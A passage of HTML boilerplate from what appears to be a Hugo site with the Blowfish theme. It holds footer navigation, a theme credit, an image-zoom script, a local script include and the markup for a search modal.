            <li class=" flex mb-1 ltr:text-right rtl:text-left sm:mb-0 ltr:sm:mr-7 ltr:sm:last:mr-0 rtl:sm:ml-7 rtl:sm:last:ml-0 ltr:mr-4 rtl:ml-4">
              <a
                class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2 flex items-center"
                href=""
                title="">
                
                
              </a>
            </li>
          
        </ul>
      </nav>
    
  
  <div class="flex items-center justify-between">
    
    

    
    
      <p class="text-xs text-neutral-500 dark:text-neutral-400">
        
        
        Powered by <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
          href="https://gohugo.io/" target="_blank" rel="noopener noreferrer">Hugo</a> &amp; <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
          href="https://blowfish.page/" target="_blank" rel="noopener noreferrer">Blowfish</a>
      </p>
    
  </div>
  
    <script>
      mediumZoom(document.querySelectorAll("img:not(.nozoom)"), {
        margin: 24,
        background: "rgba(0,0,0,0.5)",
        scrollOffset: 0,
      });
    </script>
  
  
  
  <script
    type="text/javascript"
    src="/js/process.min.ee03488f19c93c2efb199e2e3014ea5f3cb2ce7d45154adb3399a158cac27ca52831db249ede5bb602700ef87eb02434139de0858af1818ab0fb4182472204a4.js"
    integrity="sha512-7gNIjxnJPC77GZ4uMBTqXzyyzn1FFUrbM5mhWMrCfKUoMdsknt5btgJwDvh&#43;sCQ0E53ghYrxgYqw&#43;0GCRyIEpA=="></script>
  
  
</footer>
<div
  id="search-wrapper"
  class="invisible fixed inset-0 flex h-screen w-screen cursor-default flex-col bg-neutral-500/50 p-4 backdrop-blur-sm dark:bg-neutral-900/50 sm:p-6 md:p-[10vh] lg:p-[12vh] z-500"
  data-url="https://example.org/">
  <div
    id="search-modal"
    class="flex flex-col w-full max-w-3xl min-h-0 mx-auto border rounded-md shadow-lg top-20 border-neutral-200 bg-neutral dark:border-neutral-700 dark:bg-neutral-800">
    <header class="relative z-10 flex items-center justify-between flex-none px-2">
      <form class="flex items-center flex-auto min-w-0">
        <div class="flex items-center justify-center w-8 h-8 text-neutral-400">
          <span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
</span>
        </div>
        <input
          type="search"
          id="search-query"
          class="flex flex-auto h-12 mx-1 bg-transparent appearance-none focus:outline-dotted focus:outline-2 focus:outline-transparent"
          placeholder="Search"
          tabindex="0">
      </form>
      <button
        id="close-search-button"
        class="flex items-center justify-center w-8 h-8 text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400"
        title="Close (Esc)">
        <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
</span>
      </button>
    </header>
    <section class="flex-auto px-2 overflow-auto">
      <ul id="search-results">
        
      </ul>
    </section>
  </div>
</div>

    </div>
  </body>
  
</html>
